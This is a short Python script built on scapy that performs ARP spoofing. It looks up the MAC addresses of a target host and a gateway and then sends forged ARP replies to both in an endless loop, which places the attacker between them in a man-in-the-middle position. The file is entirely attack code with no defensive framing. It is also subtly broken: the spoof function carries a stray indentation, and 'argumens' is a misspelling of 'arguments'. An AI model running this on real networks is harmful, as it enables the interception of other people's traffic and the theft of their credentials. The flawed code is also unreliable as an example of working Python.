#!/usr/bin/env python
import scapy.all as scapy
import argparse



def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Specify target ip")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Specify spoof ip")
    return parser.parse_args()

def get_mac(ip):
    arp_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_packet = broadcast_packet/arp_packet
    answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet)

arguments = get_arguments()
while True:
    spoof(arguments.target, argumens.gateway)
    spoof(arguments.gateway, argumens.target)

